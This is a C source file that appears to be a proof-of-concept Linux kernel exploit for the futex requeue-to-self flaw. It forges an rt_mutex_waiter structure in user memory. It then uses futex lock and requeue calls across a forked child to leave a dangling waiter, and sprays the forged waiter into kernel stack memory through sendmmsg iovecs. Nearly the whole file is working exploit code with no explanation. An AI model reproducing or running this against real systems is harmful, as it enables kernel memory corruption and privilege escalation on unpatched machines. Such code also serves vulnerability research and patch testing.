#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <netinet/ip.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include "futex.h"
#include "errexit.h"

int main()
{
    int ret;
    int sockfd;
    int *futexes, *non_pi_futex, *pi_futex;

    struct sockaddr_in addr = {};
    struct mmsghdr msgvec = {};
    struct iovec msg[7] = {};

    struct rt_mutex_waiter *waiter, forged_waiter = {};

    char buf[0x80] = {};

    printf("forged_waiter @ %p\n", &forged_waiter);

    for (int i = 0; i < sizeof(msg) / sizeof(msg[0]); i++)
    {
        msg[i].iov_base = &forged_waiter;
        msg[i].iov_len = sizeof(forged_waiter);
    }

    waiter = (struct rt_mutex_waiter *)(buf + sizeof(buf) - 8);
    waiter->list_entry.prio = 120 + 12;
    waiter->list_entry.prio_list.next = &forged_waiter.list_entry.prio_list;

    // msgvec.msg_hdr.msg_name = buf;
    // msgvec.msg_hdr.msg_namelen = sizeof(buf);
    msgvec.msg_hdr.msg_iov = msg;
    msgvec.msg_hdr.msg_iovlen = sizeof(msg) / sizeof(msg[0]);

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1)
        errExit("socket");

    // addr.sin_family = AF_INET;
    // addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    // addr.sin_port = htons(1234);
    // if (connect(sockfd, &addr, sizeof(addr)) == -1)
    //     errExit("connect");

    futexes = mmap(NULL, sizeof(int) * 2, PROT_READ | PROT_WRITE,
                   MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (futexes == MAP_FAILED)
        errExit("mmap");

    non_pi_futex = &futexes[0];
    pi_futex = &futexes[1];

    flock(pi_futex);

    int pid = fork();
    if (pid == -1)
        errExit("fork");
    if (pid == 0)
    {
        fwait_requeue(non_pi_futex, pi_futex, 0);
        puts("Child continues.");
        if ((ret = sendmmsg(sockfd, &msgvec, 1, 0)) == -1)
            errExit("sendmmsg");
        printf("%u messages sent.\n", ret);
        exit(EXIT_SUCCESS);
    }

    sleep(1);
    frequeue(non_pi_futex, pi_futex, 1, 0);
    *pi_futex = 0;
    frequeue(pi_futex, pi_futex, 1, 0);

    wait(NULL);
}
